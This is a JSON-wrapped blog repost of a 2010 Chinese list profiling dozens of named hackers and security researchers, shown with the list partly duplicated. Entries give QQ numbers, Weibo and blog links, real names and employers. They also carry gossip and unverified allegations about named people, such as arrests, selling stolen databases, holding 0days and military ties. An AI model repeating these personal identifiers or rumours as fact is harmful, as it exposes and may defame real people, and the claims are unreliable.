target=\"_blank\" href=\"http://www.friddy.cn/\" rel=\"noopener noreferrer\">http://www.friddy.cn</a><br />QQ:568623<br />专门搞漏洞挖掘的人，虽然技术上跟最上面的那些大牛级黑客比差一些，但相对来说还是不错的。另外也对入侵检测有所研究。<br /><br />余弦<br />qq:331861985<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evilcos\" rel=\"noopener noreferrer\">http://t.qq.com/evilcos</a><br />xeye成员。目前就职于icbm的知道创宇公司，是web，脚本等方面的高手。<br /><br />教主<br />QQ:130138438<br />网站:<a target=\"_blank\" href=\"http://www.jiaozhu.org/\" rel=\"noopener noreferrer\">www.jiaozhu.org</a><br />圈内名气还算比较大的，主要还是因为他刷库赚钱很多。并且赔的也比较快。呵呵。技术不怎么样，但很能买很能卖。<br /><br />剑心<br />QQ:369458956<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/nullnull\" rel=\"noopener noreferrer\">http://t.qq.com/nullnull</a><br />方小顿。80sec站长。目前就职于百度公司，曾经跟百度公司老板李彦宏一起参加过芒果台的娱乐节目，一曲成名。不久前因为发布nginx的漏洞而又一次成名，是WEB安全，应用安全方面的高手。<br /><br />陆羽<br />QQ:170093007<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/T00ls_Luyu\" rel=\"noopener noreferrer\">http://t.qq.com/T00ls_Luyu</a><br />博客:<a target=\"_blank\" href=\"http://www.5luyu.cn/\" rel=\"noopener noreferrer\">http://www.5luyu.cn</a><br />t00ls核心成员，曾经编写过不少注入，旁注方面的辅助入侵工具，例如t00ls内部旁注工具，GETWEBSHELL等等。目前就职于奇虎360公司。<br /><br />爱无言<br />QQ:348450419<br />EST核心成员。对于漏洞挖掘，溢出利用，网络脚本安全方面有着多年经验。在国内著名黑客杂志黑客防线上发表过上百篇的文章。<br /><br />樱花浪子<br />QQ:305446947<br />博客:<a target=\"_blank\" href=\"http://www.hacklu.net/\" rel=\"noopener noreferrer\">http://www.hacklu.net/</a><br />SQL注入，WEB应用渗透技术还行。在一些黑客杂志上有过一些技术类文章。<br /><br />h4k_b4n<br />QQ:616222<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/h4k_b4n\" rel=\"noopener noreferrer\">http://t.qq.com/h4k_b4n</a><br />BCT核心成员。是WEB安全，脚本，数据库安全方面的高手，曾经发现过很多著名程序的漏洞。<br /><br />pt007<br />QQ:7491805<br />彭涛。就职于国内著名信息安全公司，启明星辰。是ISTO的创始人。对oracle,mysql等数据库已经php等脚本非常精通。有多年的开发维护测试等安全经验。著名的xp/2k/2k3完美克隆用户的程序就是他的杰作。<br /><br />majun<br />QQ:45539511<br />马俊。据说是个很能装的人。不过还是有点技术，另外还传说他是sunwear的徒弟。可能得到的真传0day有不少。那入侵网站就如鱼得水了。<br /><br />shadow<br />QQ:26727179<br />博客:<br />影子。渗透高手。perl等脚本方面的高手。<br /><br />xiaomi<br />QQ:5980740<br />小米。T00ls的创始人之一。人缘还是不错的。<br /><br />cnbird<br />QQ:441303228<br />博客:<a target=\"_blank\" href=\"http://blog.csdn.net/cnbird2008\" rel=\"noopener noreferrer\">http://blog.csdn.net/cnbi\nrd2008</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cnbird2008\" rel=\"noopener noreferrer\">http://t.qq.com/cnbird2008</a><br />如果大家经常看国内的黑客杂志肯定对这个不陌生。linux,windows全方面的渗透高手。有一定的入侵经验。<br /><br />hackest<br />QQ:297521327<br />博客:<a target=\"_blank\" href=\"http://www.hackest.cn/\" rel=\"noopener noreferrer\">http://www.hackest.cn/</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hackest\" rel=\"noopener noreferrer\">http://t.qq.com/hackest</a><br />也是搞入侵渗透的。不久前一直在卖LMHASH,MD5的彩虹表。<br /><br />惘然<br />博客:<a target=\"_blank\" href=\"http://www.wangran.net/\" rel=\"noopener noreferrer\">http://www.wangran.net/</a><br />搞渗透的<br /><br />4ngel<br />博客:<a target=\"_blank\" href=\"http://www.sablog.net/blog/\" rel=\"noopener noreferrer\">http://www.sablog.net/blog/</a><br />sablog的作者。著名的安全天使站长，现在广为流行的几个WEBSHELL都是他写的，有些是从他大代码上改的。对WEBSHELL行业有着不可磨灭的贡献，也是早期很多PHP程序漏洞的发现者。<br /><br />xhacker<br />QQ:66680800<br />小叮当。据说当年入侵过绿盟，也是混迹于黑客圈很久的人了。搞渗透不错。<br /><br />冷漠<br />QQ:386817<br />博客:fhod<a target=\"_blank\" href=\"http://www.lengmo.net/\" rel=\"noopener noreferrer\">http://www.lengmo.net/</a><br />红狼联盟的创始人。目前好像跟着某前辈黑客做事。<br /><br />fhod<br />QQ:1988415<br />博客:<a target=\"_blank\" href=\"http://0day.kr/\" rel=\"noopener noreferrer\">http://0day.kr/</a><br />目前好像跟着EST的老大打工。在渗透入侵方面也是有一定经验的，曾经写过一些文章。后来还因为黑站被抓。<br /><br />冰sugar<br />博客:<a target=\"_blank\" href=\"http://sebug.cn/\" rel=\"noopener noreferrer\">http://sebug.cn/</a><br />朱巨源。写过入门级的文章。在X档案有过投稿。也写过书《黑客攻防实战入门》。对一般的渗透技术有一定了解。<br /><br />虫子<br />QQ:712663200<br />博客:<a target=\"_blank\" href=\"http://evilh4ck.blog.sohu.com/\" rel=\"noopener noreferrer\">http://evilh4ck.blog.sohu.com/</a><br />虫总据说是入侵过不少游戏官方网站。看来应该赚了些钱。此人对入侵攻击还是有很多了解的。<br /><br />amxking<br />博客:<a target=\"_blank\" href=\"http://amxking.bokee.com/\" rel=\"noopener noreferrer\">http://amxking.bokee.com</a><br />QQ:5711277<br />红狼的核心成员，也是天阳的管理。<br /><br />七剑<br />QQ:7259561<br />博客:<a target=\"_blank\" href=\"http://1v1.name/\" rel=\"noopener noreferrer\">http://1v1.name</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/qijian\" rel=\"noopener noreferrer\">http://t.qq.com/qijian</a><br />搞WEB脚本，数据库，渗透攻击的。<br /><br />啊D<br />QQ:9269563<br />网站:<a target=\"_blank\" href=\"http://www.d99net.net/\" rel=\"noopener noreferrer\">http://www.d99net.net/</a><br />入行时间不短了，写过一些比较出名的工具，如早期的啊D网络工具包和后来的啊D注入工具。从这些可以看出对注入，编程是有一定了解的。经验比较丰富，工具虽然有BUG但还算稳定。<br /><br />雨夜<br />QQ:9148357<br />博客:<br />混迹黑客全也有数年。技术凑合。曾经也开办过黑客网站。<br /><br />redbin<br />QQ:35475<br />网站:<a target=\"_blank\" href=\"http://www.vip8.org/\" rel=\"noopener noreferrer\">http://www.vip8.org/</a><br />红滨。校园黑客联盟站长。<br />","slug":"2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解","published":1,"updated":"2023-04-22T05:49:25.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrkb5qk000074pid4c98lr0","content":"<p>2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解文章作者：<br />信息来源：邪恶八进制信息安全团队(<a target=\"_blank\" href=\"http://www.eviloctal.com/\" rel=\"noopener noreferrer\">www.eviloctal.com</a>)<br />百晓生_民间杂志【民间交流 民间技术 民间文化 民间舆论】<br />我只是在写自己所想到的杂志 我只是菜鸟！<br /><br />主页博客相册|个人档案 |好友 <br />查看文章&amp;#160; &amp;#160; <br /><br />【转帖】2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br />2010年10月06日 星期三 下午 08:06<br />强大的黑客，强大的资料，以后就跟着这榜单混了，呵呵！<br /><br />郑重声明：<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />！！！！！！！！！！！！！！！！！！！！！！<br /><br />——————————————————————————————————————————<br /><br />祝各位大牛国庆节快乐.<br /><br />本文足以轰动一下.各大网站编辑抓紧第一时间发布<br /><br />2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br /><br />首先最主要注明的是：排名不分先后<br /><br />本名单第一部分罗列的黑客都是真正拥有技术和才能者。并非大多数人平时在电视中所看到的那些盗号或入侵网站的“黑客”，电视里报道的那些人只是黑客界最底 层的人。例如熊猫烧香的作者，其实技术并不高，在黑客圈中大多数人都只是把这个病毒当作一个玩具。而技术含量高超的病毒都是类似于29A发布的那种。<br /><br />本文作者自我介绍。毕业于哈尔滨工业大学，2001年出道黑客圈，曾在国内多个黑客论坛潜水多年。参加过2004年国内顶级黑客大会XCON（安全焦点峰 会）（PS:扯淡）。2003年就职过国际顶级搜索引擎公司GOOGLE，后因个人原因离职。在黑客界有一定人缘基础。所以本文有一定权威性。至于我是 谁，避免被人追杀还是不明说了。下面开始正文：<br />第一部分列举老牌黑客。中国黑客界早期技术很牛的人。都是真正的高手。现在大部分技术还是不减当年，数一数二，是普通人望尘莫及的。<br /><br />在下面这些人中很多人手握众多危害极大的未公开漏洞。就是圈内所称的0day。这类危害极大的0day一般在黑市上可以卖的数十万人民币。<br />本文原始发布地址: <a target=\"_blank\" href=\"https://docs.google.com/leaf?id=1rO9CxzojOO0Qho-VOIUpGjwfZhAqcuRWnVXAbluCk4I&amp;sort=name&amp;layout=list&amp;num=50\" rel=\"noopener noreferrer\">https://docs.google.com/leaf?id= ... out=list&amp;num=50</a><br />一切内容以上面博客原文为准<br />注：以下列举的黑客当然只是一部分，其实还有很多的前辈级黑客。只不过现在基本都告别技术行业了。下面的人物中大部分还在相关领域活动，所以优先列出了。<br /><br />sunwear<br />QQ:47347<br />微博: <a target=\"_blank\" href=\"http://t.qq.com/sunwe4r\" rel=\"noopener noreferrer\">http://t.qq.com/sunwe4r</a><br />博客: 好像不用了<br />日娃哥。EST核心成员。圈内皆知他手握很多未公开漏洞。渗透入侵和漏洞方面的高手，曾是编程内核牛人。曾经入侵过世界顶级黑客组织Metasploit，剑桥大学等众多高端机构。几年前的世界最顶级两大黑客大会defcon和blackhat都对他有过报道。<br /><br />刺 QQ:32750912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/aullik5\" rel=\"noopener noreferrer\">http://t.qq.com/aullik5</a><br />博客:<br />刺哥，大风哥。身材瘦弱。是中国黑客圈内纯技术黑客组织幻影旅团创始人。中国顶级黑客之一。目前好像就职于淘宝公司网络安全部门。也是手握很多未公开漏洞 的人。很多影响力很大的0day都是出自幻影旅团。WebZine的发起人。并且发展过WIKI的系统。还曾远赴美国参加世界顶级黑客大会 blackhat。。<br /><br />dm<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/zoeluk\" rel=\"noopener noreferrer\">http://t.qq.com/zoeluk</a><br />博客:<br />国内顶级地下黑客组织0x557核心成员。是漏洞挖掘，利用方面的高手。不用说，手里的漏洞也是多的可以批发了。目前就职于世界著名反病毒杀毒软件公司麦咖啡(刚刚被intel收购)。现在还写起了iphone,ipad下的安全软件。看来是个全能选手。<br /><br />flashsky<br />QQ:38062 &amp; 16202253<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/flash-sky\" rel=\"noopener noreferrer\">http://t.qq.com/flash-sky</a><br />方兴。闪空哥。国内著名黑客组织安全焦点核心成员。2003年WINDOWS历史上最严重安全漏洞细节全球首发者,数百个高危级安全漏洞发现者,历任启明 星辰,美国EEYE,美国微软特聘安全专家,美国微软BLUEHAT第一个中国演讲者,安全焦点成员,南京翰海源信息技术有限公司创始人和CEO。对漏洞 方面的研究是相当高深的。预祝公司发展顺利。<br /><br />tombkeeper<br />QQ:644909<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tombkeeper\" rel=\"noopener noreferrer\">http://t.qq.com/tombkeeper</a><br />于某。传说中的tk教主。国内著名黑客组织安全焦点核心成员。就职于绿盟科技，俗称妇科圣手。对windows操作系统以及漏洞等方面的研究可以说是非常精通。而在安全焦点论坛，最近几年一直被人奉为TK教主。对于其他领域的科学也有着独到的见解。文笔思想也是很独特的。<br /><br />glacier<br />QQ:1973435<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/glacier\" rel=\"noopener noreferrer\">http://t.qq.com/glacier</a><br />黄鑫。冰河哥。黄总。同为国内著名的黑客组织安全焦点核心成员。深圳大成天下的创始人之一。是中国最早的远程控制木马&quot;冰河&quot;的作者，也是著名安全扫描工 具&quot;x-scan&quot;的作者。黑客编程方面的高手，对于网络协议，加密安全以及软件工程有很深的了解。女黑客wollf的老公。一个风趣幽默的人。从微博上 就可以看出来了。已经当父亲了，当然孩子不是木马，是一个帅哥。再此祝福一下。<br /><br />swan<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Swan557\" rel=\"noopener noreferrer\">http://t.qq.com/Swan557</a><br />0x557(SST)核心成员，对于linux,windows操作系统上的漏洞可谓了如指掌。<br /><br />goodwell<br />QQ:19558287<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/goodwell\" rel=\"noopener noreferrer\">http://t.qq.com/goodwell</a><br />龚蔚。安致信息技术有限公司。中国早起黑客组织绿色兵团创始人，是传说中的中国黑客教父。曾经接受过中央电视台的参访。是以为资深的魔兽世界玩家。<br /><br />xundi<br />QQ:518860<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/idnuxzhang\" rel=\"noopener noreferrer\">http://t.qq.com/idnuxzhang</a><br />张迅迪。国内早期的著名黑客组织安全焦点创始人。具体就不过多介绍了，因为不熟悉，哈哈。<br /><br />lion<br />QQ:21509<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/coollion\" rel=\"noopener noreferrer\">http://t.qq.com/coollion</a><br />林勇。中国红客联盟创始人。跟大多网民在网上所了解到的中国红客大联盟不同。这个才是真正的中国红客联盟。至于所谓的sharpwinner，我只能用一句文明用语敏感词来形容“SB”“草泥马”。现在对于技术不如当年，而且已经远离技术告别当初了。<br /><br />isno<br />QQ:1070681<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/isnoblah\" rel=\"noopener noreferrer\">http://t.qq.com/isnoblah</a><br />安全焦点核心成员之一。目前就职于北京中航嘉信公司。曾经写过很多漏洞溢出方面的分析利用文章（WEBDAV,IDQ,IDA等）。exploit也写过很多。现在较为低调。<br /><br />天行<br />QQ:911189<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tian_xing\n\" rel=\"noopener noreferrer\">http://t.qq.com/tian_xing</a> 好像不怎么用<br />中国第一代黑客之一。在1999年曾经与发动对国外网站的攻击。网络刺客,网络卫兵是其代表作品。而他对溢出和漏洞利用也颇有研究，例如RPC漏洞利用程序。以及他写的后门都很好。<br /><br />quack<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wulujia\" rel=\"noopener noreferrer\">http://t.qq.com/wulujia</a><br />吴鲁佳。深圳达成天下创始人。与中国木马之父黄鑫关系很好。安全焦点早期活跃之人，ID：quack。<br /><br />icbm<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/icbmx2\" rel=\"noopener noreferrer\">http://t.qq.com/icbmx2</a> 基本不用<br />赵伟。知道创宇创始人之一。曾经就职于国内著名信息安全公司启明星辰积极防御实验室。对各操作系统以及第三方软件的漏洞有很深的了解，手下的未公开漏洞很多。包括基于web方面的一些独特漏洞。<br /><br />sowhat<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/secsecsec\" rel=\"noopener noreferrer\">http://t.qq.com/secsecsec</a><br />薛峰。就职于某保密单位。曾赴美国参加过国际顶级黑客大会blackhat。手握很多未公开漏洞。好像今年中国顶级黑客盛会xcon上还抽奖中了一台PS3。<br /><br />vxk<br />QQ:86879759<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cvcvxk\" rel=\"noopener noreferrer\">http://t.qq.com/cvcvxk</a><br />几年前活跃于国内著名病毒论坛CVC。是国内知名的病毒专家。对操作系统内核以及编程，逆向，破解非常精通。可谓程序全能专家。<br /><br />refdom<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/refdom\" rel=\"noopener noreferrer\">http://t.qq.com/refdom</a><br />安全焦点核心成员之一。曾经是中国红客联盟的一员。<br /><br />watercloud<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/watercloud\" rel=\"noopener noreferrer\">http://t.qq.com/watercloud</a><br />知道创宇公司创始人之一。与icbm关系甚好。安全焦点核心成员之一。对漏洞，加密解密等方面有者多年的研究经验，网络安全趋势与发展有着独到的见解。最主要的还是对漏洞，0day方面，手握0day数量也很客观。<br /><br />alert7<br />QQ:415451<br />博客:<br />安全焦点核心成员之一。曾经就职与著名杀毒软件MCAFEE。目前就职于南京翰海源(Flashsky的公司)。对linux 方面的研究经验长达10年以上。对于linux等开源系统漏洞溢出分析利用了如指掌。<br /><br />袁哥<br />博客:<br />传说中的袁哥。没错，中国所有圈内顶级黑客无不佩服的人。就只与绿盟科技。袁哥在数学，编程，漏洞等诸多方面的造诣是无人可以比拟的。很多漏洞要早其它人数年之久就已经发现并且完美利用了。堪称漏洞方面的其人。黑客界的顶级高手。<br /><br />sunx<br />QQ:239670<br />孙华。国内非常著名的黑客编程高手，对漏洞溢出与利用和有研究，写过EXPLOIT。例如IDA漏洞和printer。在9X年代用汇编写过病毒。并且还编写过操作系统后门程序。<br /><br />funnywei<br />QQ:25044885<br />魏强。F博士。安全焦点核心成员之一。漏洞挖掘，漏洞利用方面的高手，在历届国内顶级黑客盛会XCON上都能见到他的身影。据传就职于中国人民解放军XXX部。为中国人民解放军提供很多未公开漏洞。<br /><br />小榕<br />中国早期著名黑客软件“流光”“逆雪”“乱刀”“黑客字典生成器”“ARPSNIFFER”“命令行注入工具”等黑客软件作者。目前对于漏洞方面等技术不如以上几人。不过对于中国黑客界的贡献还是不可小觑的。<br /><br />xikug<br />QQ:53564797<br />国内著名内核，漏洞，程序研究站debugman的站长。逆向，破解，加密，解密，内核等方面的高人。<br /><br />baoz<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/perlish\" rel=\"noopener noreferrer\">http://t.qq.com/perlish</a><br />方勇。包子。fatb。多年前就活跃于中国黑客界。活跃程度和人缘还是不错的。目前就职与迅雷公司。有大牛曾说是个带眼镜的胖子。为人厚道，皮肤较黑。<br /><br />wzt<br />QQ:71579912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wztjlh\" rel=\"noopener noreferrer\">http://t.qq.com/wztjlh</a><br />曾经的中国红客联盟核心成员。对于linux内核，以及linux漏洞方面颇有研究。<br /><br />czy<br />QQ:484323<br />四川的一个著名黑客，比较低调，但地下交流圈子中交流频繁。手握很多0day的高手。<br /><br />zzzevazzz<br />QQ:49322630<br />博客:<a target=\"_blank\" href=\"http://zzzevazzz.bokee.com/\" rel=\"noopener noreferrer\">http://zzzevazzz.bokee.com/</a><br />国内著名黑客组织幻影旅团核心成员。早期混迹于灰色轨迹。曾经著名的do all in cmdshell  作者。曾经在安全焦点普及ntsd知识，红极一时。对于windows内核以及漏洞方面有着深入的了解和经验。曾经写过很多有利于大众的文章，分享过很多 宝贵的经验。<br /><br />vessial<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/vessial\" rel=\"noopener noreferrer\">http://t.qq.com/vessial</a><br />同dm一样就职于国际顶级杀毒软件安全厂商麦咖啡公司。也是一位对于漏洞等方面有诸多经验的高手。<br /><br />bkbll<br />qq:78384349<br />dumplogon。BK哥。中国红客联盟核心成员之一。2001年中美黑客大战时期技术还是初级的，但也算早期了。后来对溢出，漏洞以及逆向分析方面颇有研究，技术不错。是lion的好朋友。<br /><br />killer<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/dongzhiqiang\" rel=\"noopener noreferrer\">http://t.qq.com/dongzhiqiang</a><br />博客:<br />董志强。安全焦点核心成员之一。曾经就只与启明星辰公司。对于病毒与防病毒，逆向工程与破解等方面有多年的研究经验。目前为著名安全产品超级巡警的BOSS。<br /><br />coolq<br />qq:49462335<br />就职于绿盟科技的linux方面高手。在绿盟期刊上曾发有著作。对于开源系统有着多年的应用开发经验。linux,unix,bsd内核方面以及漏洞挖掘，利用方面也有着多年的经验。<br /><br />pjf<br />qq:85863144<br />博客:<a target=\"_blank\" href=\"http://pjf.blogcn.com/\" rel=\"noopener noreferrer\">http://pjf.blogcn.com/</a><br />国内著名antirootkit工具icesword的作者。是内核方面的专家。国内著名安全软件公司奇虎360公司的核心开发人员。<br /><br />lcx<br />海洋顶端网站长，是国内渗透入侵方面的高手，有着多年的入侵经验。是中国网马教父之一。安全手册的顾问。<br /><br />村长<br />QQ:6021240<br />国内顶级黑客组织0x557(SST)创始人。是国内著名信息安全公司启明星辰积极防御实验室的BOSS。对windows,linux非常了解，拥有多年的漏洞挖掘，利用的经验。<br /><br />casper<br />QQ:843525<br />华永兴安BOSS。国内顶级黑客大会xcon的主办方，也是安全焦点创始人之一。中国黑客界的老前辈。目前已经脱离技术领域，向老板发展了。<br /><br />e4gle<br />QQ:1949479<br />国内著名黑客组织WSS核心成员。老一代的黑客。对linux,unix下的溢出漏洞分析以及利用有着多年的研究经验，并且对病毒也很了解。<br />——————–华丽的分割线———————-<br /><br />下面将列举一些新生力量，虽然是新生，但起码都是3-6年前左右就开始活跃的人，所以还算是中生代黑客。<br /><br />mj0011<br />QQ:保密，避免骂他的人太多。<br />博客:<br />就职于国内著名安全公司奇虎360。为核心工程师。圈内敌人无数，只因口无遮拦，相貌丑陋等缺点所导致。对瑞星，金山等公司曾经常出言讽刺，另外连国际顶 级安全厂商赛门铁克也不放过。可谓毒舌娘子，连我也被骂过好几次。话说回来，对于编程，内核，木马，远控方面的技术还是不可否定的。<br /><br />baiyuanfan<br />QQ:51449276<br />曾经著名的后门程序BYSHELL的作者。曾经在某界安全焦点峰会上有过演讲议题，技术还是不错的。<br /><br />zwell<br />QQ:27592430<br />网站:<a target=\"_blank\" href=\"http:/\n/www.nosec.org/\" rel=\"noopener noreferrer\">http://www.nosec.org</a><br />白远方。曾经NB联盟核心成员。现在为诺塞科技的老大。诺塞科技的产品现在也广为圈内所知，例如穿山甲，JSKY等工具。对编程和注入WEB方面的东西也是很精通的。<br /><br />sudami<br />qq:527463097<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/sudami\" rel=\"noopener noreferrer\">http://t.qq.com/sudami</a><br />博客:<br />目前就职于国内著名杀毒软件安全软件厂商奇虎360公司。是后起的windows编程，内核之秀。对渗透攻击，入侵方面技术基本为零。曾在邪恶八进制，DEBUGMAN等论坛发表过多篇原创文章。对技术很有追求，进步很快的一个牛人。<br /><br />oldjun<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/seuhacker\" rel=\"noopener noreferrer\">http://t.qq.com/seuhacker</a><br />博客:<a target=\"_blank\" href=\"http://www.oldjun.com/\" rel=\"noopener noreferrer\">http://www.oldjun.com/</a><br />QQ:34680304<br />t00ls核心成员。asp,php等WEB脚本方面的高手，对于渗透入侵，WEB渗透相当精通。<br /><br />9xiao<br />博客: &amp; <a target=\"_blank\" href=\"http://www.9xiao.net/\" rel=\"noopener noreferrer\">www.9xiao.net</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/deioncube\" rel=\"noopener noreferrer\">http://t.qq.com/deioncube</a><br />t00ls核心成员，原火狐联盟的人。<br /><br />aono<br />QQ:13335589<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/air-storm\" rel=\"noopener noreferrer\">http://t.qq.com/air-storm</a><br />t00ls核心成员。无线安全方面的高手。在无线网络安方面有其独特的技术思想和经验。<br /><br />云舒<br />QQ:21287305<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/yunshuy\" rel=\"noopener noreferrer\">http://t.qq.com/yunshuy</a><br />是幻影旅团的核心成员之一，目前同axis一同就职于淘宝公司。其实也算的上是一位比较有资历的老人了。应该位列在上面。写过synflood方面代码。<br /><br />明小子<br />QQ:830540<br />网站:<a target=\"_blank\" href=\"http://www.hackdiy.com/\" rel=\"noopener noreferrer\">http://www.hackdiy.com/</a><br />黑客动画吧的人。著名的明小子旁注工具domain的作者。相比很多菜鸟都以及享受过这个工具的实惠了。其实技术只能说是一般。不过入行也不久了。注入脚本以及简易的编程还是不错的。<br /><br />鬼仔<br />QQ:359421<br />博客:<a target=\"_blank\" href=\"http://huaidan.org/\" rel=\"noopener noreferrer\">http://huaidan.org</a><br />目前就职于新浪公司。WEB应用安全方面的高手。<br /><br />lake2<br />QQ:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br />脚本，数据库，渗透方面的高手。目前就职于腾讯QQ公司。<br /><br />neeao<br />QQ:35789112<br />WEB应用安全及脚本方面的高手。<br /><br />u#0h4x0r<br />博客:<a target=\"_blank\" href=\"http://www.noahacker.com/\" rel=\"noopener noreferrer\">http://www.noahacker.com/</a><br />QQ:645041992<br />对JAVA有一定了解，对渗透也有一些研究。入侵过不少无辜网站。<br /><br />hmily<br />qq:68857640<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Hmily_LCG\" rel=\"noopener noreferrer\">http://t.qq.com/Hmily_LCG</a><br />博客:<br />吾爱破解的BOSS。是程序破解，软件破解，加密解密，逆向工程方面的高手。破解过很多大家常用的工具，如穿山甲。<br /><br />xi4oyu<br />博客:<a target=\"_blank\" href=\"http://www.pentestday.com/\" rel=\"noopener noreferrer\">http://www.pentestday.com/</a> &amp; <br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evil_xi4oyu\" rel=\"noopener noreferrer\">http://t.qq.com/evil_xi4oyu</a><br />qq:909473606<br />linux方面的高手。<br /><br />猪猪<br />QQ:82648 &amp; 100298<br />岁月联盟站长。入行也有几年了。曾经参加过爱国反击黑客战。也入侵过不少圈内的同行网站。对ASP，注入方面比较了解。<br /><br />rayh4c<br />qq:30039780<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/rayh4c\" rel=\"noopener noreferrer\">http://t.qq.com/rayh4c</a><br />茄子宝。80SEC核心成员。对xss，CSRF等脚本漏洞非常精通。经验丰富。<br /><br />superhei<br />QQ:123230273<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hi_heige\" rel=\"noopener noreferrer\">http://t.qq.com/hi_heige</a><br />幻影旅团核心成员。曾经写过著名的php注入漏洞利用工具。发现过很多国内流行的php程序漏洞。是WEB脚本，数据库方面的专家。<br /><br />ring04h<br />QQ:153520368<br />博客:<br />EST核心成员。与国内顶级黑客sunwear关系甚好。曾一同入侵过国内最著名的两大PHP论坛。此人对php，数据库等方面相当精通。<br /><br />冰血封情<br />QQ:310926<br />博客:<a target=\"_blank\" href=\"http://weblog.eviloctal.com/\" rel=\"noopener noreferrer\">http://weblog.eviloctal.com/</a><br />EST创始人。传说中的中国第四代黑客。据传说已经自己开公司，很久不做技术了。<br /><br />冰的原点<br />QQ:519249638<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/icezone\" rel=\"noopener noreferrer\">http://t.qq.com/icezone</a><br />黑客手册常见的人。是入门级黑客书籍《黑客渗透笔记》的原作者。对于初学者来说还是有一定学习价值的。<br /><br />friddy<br />博客:<a target=\"_blank\" href=\"http://www.friddy.cn/\" rel=\"noopener noreferrer\">http://www.friddy.cn</a><br />QQ:568623<br />专门搞漏洞挖掘的人，虽然技术上跟最上面的那些大牛级黑客比差一些，但相对来说还是不错的。另外也对入侵检测有所研究。<br /><br />余弦<br />qq:331861985<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evilcos\" rel=\"noopener noreferrer\">http://t.qq.com/evilcos</a><br />xeye成员。目前就职于icbm的知道创宇公司，是web，脚本等方面的高手。<br /><br />教主<br />QQ:130138438<br />网站:<a target=\"_blank\" href=\"http://www.jiaozhu.org/\" rel=\"noopener noreferrer\">www.jiaozhu.org</a><br />圈内名气还算比较大的，主要还是因为他刷库赚钱很多。并且赔的也比较快。呵呵。技术不怎么样，但很能买很能卖。<br /><br />剑心<br />QQ:369458956<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/nullnull\" rel=\"noopener noreferrer\">http://t.qq.com/nullnull</a><br />方小顿。80sec站长。目前就职于百度公司，曾经跟百度公司老板李彦宏一起参加过芒果台的娱乐节目，一曲成名。不久前因为发布nginx的漏洞而又一次成名，是WEB安全，应用安全方面的高手。<br /><br />陆羽<br />QQ:170093007<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/T00ls_Luyu\" rel=\"noopener noreferrer\">http://t.qq.com/T00ls_Luyu</a><br />博客:<a target=\"_blank\" href=\"http://www.5luyu.cn/\" rel=\"noopener noreferrer\">http://www.5luyu.cn</a><br />t00ls核心成员，曾经编写过不少注入，旁注方面的辅助入侵工具，例如t00ls内部旁注工具，GETWEBSHELL等等。目前就职于奇虎360公司。<br /><br />爱无言<br />QQ:348450419<br />EST核心成员。对于漏洞挖掘，溢出利用，网络脚本安全方面有着多年经验。在国内著名黑客杂志黑客防线上发表过上百篇的文章。<br /><br />樱花浪子<br />QQ:305446947<br />博客:<a target=\"_blank\" href=\"http://www.hacklu.net/\" rel=\"noopener noreferrer\">http://www.hacklu.net/</a><br />SQL注入，WEB应用渗透技术还行。在一些黑客杂志上有过一些技术类文章。<br /><br />h4k_b4n<br />QQ:616222<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/h4k_b4n\" rel=\"noopener noreferrer\">http://t.qq.com/h4k_b4n</a><br />BCT核心成员。是WEB安全，脚本，数据库安全方面的高手，曾经发现过很多著名程序的漏洞。<br /><br />pt007<br />QQ:7491805<br 